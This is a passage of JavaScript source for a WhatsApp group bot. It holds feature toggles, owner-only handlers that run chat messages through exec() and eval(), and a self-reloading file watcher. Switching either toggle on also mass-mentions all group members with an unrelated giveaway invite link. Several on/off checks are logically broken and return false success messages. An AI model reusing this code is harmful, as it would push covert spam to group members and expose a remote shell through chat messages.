Biiofc.sendMessage(from, {text: `\`\`\`JOIN GUYS DI 850 MEMBER MAU GIVE AWAY VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!autojpm) return reply('Sukses Menonaktifkan Tuan✅')
let off = autojpm.indexOf(from)
autojpm.splice(off, 1)
fs.writeFileSync('./database/autojpm.json', JSON.stringify(autojpm))
reply('Success in turning off autojpm in this group')
} else {
await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinkgc': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinkgc) return reply('Sukses Mengaktifikan Tuan✅')
antilinkgc.push(from)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(antilinkgc))
reply('Success in turning on antilinkgc in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`JOIN GUYS 850 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinkgc) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinkgc.indexOf(from)
antilinkgc.splice(off, 1)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(antilinkgc))
reply('Success in turning off antilinkgc in this group')
} else {
await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
default:
}
if (budy.startsWith('$')) {
if (!isOwner) return reply(`CIEE MAU NYOLONG FITUR SC, DARI PADA NYOLONG MENDING BUY DI OWNERKU. KETIK .owner`)
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
Biiofc.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})